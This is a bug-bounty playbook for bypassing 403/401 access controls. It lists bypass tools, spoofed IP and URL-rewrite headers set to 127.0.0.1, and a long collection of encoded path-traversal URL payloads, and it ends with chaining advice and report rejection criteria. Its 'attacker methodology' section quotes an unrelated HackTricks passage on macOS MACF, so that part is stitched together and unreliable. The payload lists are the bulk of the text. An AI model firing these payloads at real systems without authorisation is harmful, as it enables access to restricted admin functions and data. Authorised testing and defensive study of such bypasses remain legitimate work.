# Real-World Playbook — 403 / 401 Access-Control Bypass

**Class:** `403-bypass` · **Coverage-matrix tier:** 1 · **Hunter2:** /bypass-403 · **Skill:** web2-vuln-classes
**Sources:** [reddelexc/hackerone-reports](https://github.com/reddelexc/hackerone-reports) (disclosed reports) · [Az0x7/vulnerability-Checklist](https://github.com/Az0x7/vulnerability-Checklist) (test flow) · [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) + [payloadbox](https://github.com/payloadbox) (payloads) · [OWASP WSTG](https://github.com/OWASP/wstg) + [HowToHunt](https://github.com/KathanP19/HowToHunt) + [AllAboutBugBounty](https://github.com/daffainfo/AllAboutBugBounty) + [HackTricks](https://github.com/HackTricks-wiki/hacktricks) (method)

## Test flow / checklist — do these in order
*(imported from Az0x7/vulnerability-Checklist; run each, mark result in the coverage matrix)*

[ ] Tools
```
https://github.com/iamj0ker/bypass-403
https://github.com/channyein1337/403-bypass/blob/main/403-bypass.py
https://github.com/nico989/B1pass3r
https://github.com/Dheerajmadhukar/4-ZERO-3
```
[ ] bypass by fuzz or brute force
```
you can use dirsearch tool or discovery content path 
```

[ ] bypass by waybachurl
```
search in wayback about this subdomain you can find any important path 
```

[ ] bypass by header names
```
Base-Url
Client-IP
Http-Url
Proxy-Host
Proxy-Url
Real-Ip
Redirect
Referer
Referrer
Refferer
Request-Uri
Uri
Url
X-Client-IP
X-Custom-IP-Authorization
X-Forward-For
X-Forwarded-By
X-Forwarded-For-Original
X-Forwarded-For
X-Forwarded-Host
X-Forwarded-Port
X-Forwarded-Port
X-Forwarded-Port
X-Forwarded-Port
X-Forwarded-Port
X-Forwarded-Scheme
X-Forwarded-Scheme
X-Forwarded-Server
X-Forwarded
X-Forwarder-For
X-Host
X-Http-Destinationurl
X-Http-Host-Override
X-Original-Remote-Addr
X-Original-Url
X-Originating-IP
X-Proxy-Url
X-Real-Ip
X-Remote-Addr
X-Remote-IP
X-Rewrite-Url
X-True-IP
```

[ ] bypass by header payloads
```
Base-Url: 127.0.0.1
Client-IP: 127.0.0.1
Http-Url: 127.0.0.1
Proxy-Host: 127.0.0.1
Proxy-Url: 127.0.0.1
Real-Ip: 127.0.0.1
Redirect: 127.0.0.1
Referer: 127.0.0.1
Referrer: 127.0.0.1
Refferer: 127.0.0.1
Request-Uri: 127.0.0.1
Uri: 127.0.0.1
Url: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Forward-For: 127.0.0.1
X-Forwarded-By: 127.0.0.1
X-Forwarded-For-Original: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Forwarded-Port: 443
X-Forwarded-Port: 4443
X-Forwarded-Port: 80
X-Forwarded-Port: 8080
X-Forwarded-Port: 8443
X-Forwarded-Scheme: http
X-Forwarded-Scheme: https
X-Forwarded-Server: 127.0.0.1
X-Forwarded: 127.0.0.1
X-Forwarder-For: 127.0.0.1
X-Host: 127.0.0.1
X-Http-Destinationurl: 127.0.0.1
X-Http-Host-Override: 127.0.0.1
X-Original-Remote-Addr: 127.0.0.1
X-Original-Url: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Proxy-Url: 127.0.0.1
X-Real-Ip: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Rewrite-Url: 127.0.0.1
X-True-IP: 127.0.0.1
```

[ ] bypass by url payloads
```
#
#?
%09
%09%3b
%09..
%09;
%20
%23
%23%3f
%252f%252f
%252f/
%2e%2e
%2e%2e/
%2f
%2f%20%23
%2f%23
%2f%2f
%2f%3b%2f
%2f%3b%2f%2f
%2f%3f
%2f%3f/
%2f/
%2f;?
%2f?;
%3b
%3b%09
%3b%2f%2e%2e
%3b%2f%2e%2e%2f%2e%2e%2f%2f
%3b%2f%2e.
%3b%2f..
%3b/%2e%2e/..%2f%2f
%3b/%2e.
%3b/%2f%2f../
%3b/..
%3b//%2f../
%3f%23
%3f%3f
%3f.php
..
..%00/
..%00/;
..%00;/
..%09
..%0d/
..%0d/;
..%0d;/
..%5c/
..%ff/
..%ff/;
..%ff;/
../
..;%00/
..;%0d/
..;%ff/
..;\
..;\;
..\
..\;
.html
.json
/
/#
/%20
/%20#
/%20%23
/%23
/%252e%252e%252f/
/%252e%252e%253b/
/%252e%252f/
/%252e%253b/
/%252e/
/%252f
/%2e%2e
/%2e%2e%2f/
/%2e%2e%3b/
/%2e%2e/
/%2e%2f/
/%2e%3b/
/%2e%3b//
/%2e/
/%2e//
/%2f
/%3b/
/..
/..%2f
/..%2f..%2f
/..%2f..%2f..%2f
/../
/../../
/../../../
/../../..//
/../..//
/../..//../
/../..;/
/.././../
/../.;/../
/..//
/..//../
/..//../../
/..//..;/
/../;/
/../;/../
/..;%2f
/..;%2f..;%2f
/..;%2f..;%2f..;%2f
/..;/
/..;/../
/..;/..;/
/..;//
/..;//../
/..;//..;/
/..;/;/
/..;/;/..;/
/./
/.//
/.;/
/.;//
//
//..
//../../
//..;
//./
//.;/
///..
///../
///..//
///..;
///..;/
///..;//
//;/
/;/
/;//
/;?
/;x
/;x/
/?
/?;
/x/../
/x/..//
/x/../;/
/x/..;/
/x/..;//
/x/..;/;/
/x//../
/x//..;/
/x/;/../
/x/;/..;/
;
;%09
;%09..
;%09..;
;%09;
;%2F..
;%2f%2e%2e
;%2f%2e%2e%2f%2e%2e%2f%2f
;%2f%2f/../
;%2f..
;%2f..%2f%2e%2e%2f%2f
;%2f..%2f..%2f%2f
;%2f..%2f/
;%2f..%2f/..%2f
;%2f..%2f/../
;%2f../%2f..%2f
;%2f../%2f../
;%2f..//..%2f
;%2f..//../
;%2f..///
;%2f..///;
;%2f..//;/
;%2f..//;/;
;%2f../;//
;%2f../;/;/
;%2f../;/;/;
;%2f..;///
;%2f..;//;/
;%2f..;/;//
;%2f/%2f../
;%2f//..%2f
;%2f//../
;%2f//..;/
;%2f/;/../
;%2f/;/..;/
;%2f;//../
;%2f;/;/..;/
;/%2e%2e
;/%2e%2e%2f%2f
;/%2e%2e%2f/
;/%2e%2e/
;/%2e.
;/%2f%2f../
;/%2f/..%2f
;/%2f/../
;/.%2e
;/.%2e/%2e%2e/%2f
;/..
;/..%2f
;/..%2f%2f../
;/..%2f..%2f
;/..%2f/
;/..%2f//
;/../
;/../%2f/
;/../../
;/../..//
;/.././../
;/../.;/../
;/..//
;/..//%2e%2e/
;/..//%2f
;/..//../
;/..///
;/../;/
;/../;/../
;/..;
;/.;.
;//%2f../
;//..
;//../../
;///..
;///../
;///..//
;?
;x
;x/
;x;
?
?#
?.php
?;
??
///
/%2f/
//%2f
%2f/%2f
%2f%2f%2f
%2f//
```

## Real attacker flow / methodology
*(how real hunters approach this class step by step)*

### From HackTricks (excerpt — see [HackTricks](https://github.com/HackTricks-wiki/hacktricks) for full)
### macOS MACF


#### Basic Information

**MACF** stands for **Mandatory Access Control Framework**, which is a security system built into the operating system to help protect your computer. It works by setting **strict rules about who or what can access certain parts of the system**, such as files, applications, and system resources. By enforcing these rules automatically, MACF ensures that only authorized users and processes can perform specific actions, reducing the risk of unauthorized access or malicious activities.

Note that MACF doesn't really make any decisions as it just **intercepts** actions, it leaves the decisions to the **policy modules** (kernel extensions) it calls like `AppleMobileFileIntegrity.kext`, `Quarantine.kext`, `Sandbox.kext`, `TMSafetyNet.kext` and `mcxalr.kext`.

- A policy may be enforcing (return 0 non-zero on some operation)
- A policy may be monitoring (return 0, so as not to object but piggyback on hook to do something)
- A MACF static policy is installed in boot and will NEVER be removed
- A MACF dynamic policy is installed by a KEXT (kextload) and may hypothetically be kextunloaded
- In iOS only static policies are allowed and in macOS static + dynamic.<sup>[[7]](#references)</sup>

##### Flow

1. Process performs a syscall/mach trap
2. The relevant function is called inside the kernel
3. Function calls MACF
4. MACF checks policy modules that requested to hook that function in their policy
5. MACF calls the relevant policies

*(truncated — open the source link for the full method)*

## Chaining — always ask "what does this unlock?"
- Path/method/header trick reaches a forbidden admin endpoint → BFLA
- X-Original-URL / X-Rewrite-URL / case / trailing-slash bypass

## Hunter2 wiring
- **Run:** `/bypass-403`
- **Skill:** `web2-vuln-classes`
- **Coverage-matrix tier:** 1 (Tier 0 = test first)

## What gets this rejected (kill before you write)
*(from the toolkit NEVER-SUBMIT list — match one of these with no chain → KILL IT)*
- 403/401 bypass that lands on a page with no sensitive data or action behind it — reaching a blank/placeholder/login page is not impact
- WAF returns 200 with a block-page body (Cloudflare challenge, F5 "request rejected", Imperva CAPTCHA) — that's a soft block, not a bypass
- Header/path trick flips 403→200 but the body is identical to the public/unauthorized response (no new data exposed)
- Banner / version / internal-IP disclosure surfaced by the endpoint, with no working CVE or protected function reached
- Deny-by-design endpoints (health checks, `/server-status` still gated) that expose nothing sensitive

**Conditionally valid (only WITH a chain):** bypass reaches a forbidden admin endpoint or sensitive function (BFLA) with proof the action/data is now accessible → Medium/High.
